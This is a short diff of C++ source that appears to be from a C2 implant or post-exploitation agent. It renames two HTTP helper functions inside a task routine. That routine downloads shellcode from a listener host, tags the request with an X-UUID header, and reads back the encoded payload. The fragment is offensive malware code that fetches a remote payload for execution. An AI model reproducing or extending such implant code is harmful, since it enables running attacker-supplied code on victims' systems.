@@ -10,7 +10,7 @@ namespace Task
         std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         // Download shellcode
-		System::Http::WinHttpResponse resp = System::Http::SendRequest(
+		System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
 			pState->hConnect,
 			pState->lpListenerHost,
@@ -26,7 +26,7 @@ namespace Task
 			return L"Error: Failed to download shellcode.";
 		}
 
-        std::wstring wEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
+        std::wstring wEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
         if (wEnc.length() == 0)
             return L"Error: Failed to read response.";
 
